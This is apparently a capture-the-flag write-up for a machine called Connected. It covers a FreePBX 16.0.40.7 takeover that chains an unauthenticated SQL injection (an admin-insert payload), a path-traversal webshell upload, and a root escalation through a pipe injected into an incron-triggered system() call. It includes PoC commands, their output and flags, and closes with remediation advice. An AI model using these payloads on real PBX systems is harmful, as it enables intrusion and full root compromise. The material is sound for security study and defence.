The shape of it

Connected is two mistakes in series. A public FreePBX 16.0.40.7 admin panel is vulnerable to a chained pre-auth RCE (CVE-2025-57819 → CVE-2025-61678), dropping you in as the low-privilege asterisk user. Root then falls to a root-owned incron watcher that runs a hook script with attacker-controlled parameters spliced straight into system() — behind a character blacklist that forgot the pipe.

nmap 3 ports → 22/80/443 └─ :80 → connected.htb → /admin = FreePBX 16.0.40.7 └─ CVE-2025-57819 unauth SQLi → INSERT admin into ampusers └─ CVE-2025-61678 firmware upload path-traversal → PHP webshell └─ RCE as asterisk → user.txt └─ root incron watches /var/spool/asterisk/incron └─ sysadmin_manager: system("$hook $params"), '|' not filtered └─ ucp.logrotate.CONTENTS = "x | chmod u+s /bin/bash" └─ /bin/bash -p → root → root.txt

A PBX with a name

A full TCP scan turns up three ports. Port 80 immediately redirects to a virtual host, connected.htb, so the name goes in /etc/hosts. The 443 certificate is issued to pbxconnect and requests fall through to config.php — the tells of a FreePBX install.

$ nmap -Pn -sV -sC -p- --min-rate 3000 10.129.245.100
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) PHP/7.4.16)  → 301 http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 · ssl-cert CN=pbxconnect

connected.htb/ redirects / → /admin, landing on the FreePBX Administration login. The page banner pins the exact build:

$ curl -s -H "Host: connected.htb" http://10.129.245.100/admin/ | grep -io 'version=[0-9.]*' | head -1
version=16.0.40.7
Why it matters

FreePBX 16.0.40.7 with the commercial Endpoint Manager module is vulnerable to a pre-auth RCE chain that was disclosed and exploited in the wild in August 2025. Fingerprint the module version — the bug is in the commercial add-on, not core.

02

Two bugs, one shell

The Endpoint Manager module carries a chained pre-auth RCE: CVE-2025-57819 — an unauthenticated stacked SQL injection through the brand parameter of the endpoint loader — is used to INSERT a brand-new administrator straight into the ampusers table:

GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&brand=<payload>

x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections)
    VALUES (0x..., 0x<sha1(pw)>, 0x2a)-- -

Logged in as that admin, CVE-2025-61678 — a path-traversal file upload in the firmware uploader (fwbrand=../../../var/www/html/<dir>) — drops a PHP webshell into the web root. A public PoC chains both:

$ python3 exploit.py --rhost connected.htb --http --rport 80 --command "id"
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

$ python3 exploit.py ... --command "cat /home/asterisk/user.txt"
3e44b40ed3b56c9463b183dcb7d4708a
Takeaway

An internet-reachable PBX admin panel on an outdated FreePBX is a full pre-auth takeover. The SQLi and the file-upload live in the commercial Endpoint Manager — an unpatched add-on is as good as an open door.

The pipe the blacklist forgot

Quick vectors close fast: pkexec is the patched PwnKit build (Jan 2022), staprun needs a group asterisk doesn't have, the kernel is outside DirtyPipe, and the custom root service aiovega only proxies outbound. The way up is incron. incrond runs as root and watches a spool directory:

/var/spool/asterisk/incron  IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#

Writing a file there runs sysadmin_manager <name> as root. The script parses the name as module.hook.params, GPG-validates the hook, then runs it — splicing the params into a shell string:

$verify = $g->checkSig($sigfile);          // GPG-verify module.sig
if (hash_file('sha256',$hookfile) !== $verify['hashes']["hooks/$hook"]) exit;  // hook untampered?
...
if (preg_match('/[^\x20-\x7e]/', $params)) exit;   // printable ASCII only
if (preg_match('/[`\'"$><&;]/', $params)) exit;  // blocks ` ' " $ > < & ;  — but NOT |
system("$hookfile $params");              // hook runs as ROOT

The hook file can't be modified (that breaks its signed hash), but the params can carry a pipe. Naming the trigger module.hook.CONTENTS pulls $params from the file's body — dodging the "no / in a filename" limit. Using the unmodified, still-signed ucp/logrotate hook:

$ python3 exploit.py ... --command \
    "printf 'x | chmod u+s /bin/bash' > /var/spool/asterisk/incron/ucp.logrotate.CONTENTS"

# root now runs:  system(".../ucp/hooks/logrotate x | chmod u+s /bin/bash")

$ python3 exploit.py ... --command "/bin/bash -p -c 'id; cat /root/root.txt'"
uid=999(asterisk) gid=1000(asterisk) euid=0(root)
78c56c15caa37f650f412744977f061e
Why it works

sysadmin_manager painstakingly verifies the hook file's integrity (GPG + sha256), then interpolates attacker-controlled params into system(). A character blacklist that forgets | is not a boundary — the fix is escapeshellarg / an argv array, not a longer blacklist.

Closing Connected

  • Patch the PBX. Update the Endpoint Manager module (FreePBX 16 → Endpoint ≥ 16.0.89) to close CVE-2025-57819 / CVE-2025-61678, and keep /admin off the public internet.
  • Never build a shell string from input. sysadmin_manager should pass hook params as an argv array (proc_open / escapeshellarg), with a strict allowlist — not a blacklist that omits |.
  • Least privilege. The web user must not be able to write files that a root incron watcher then executes against.
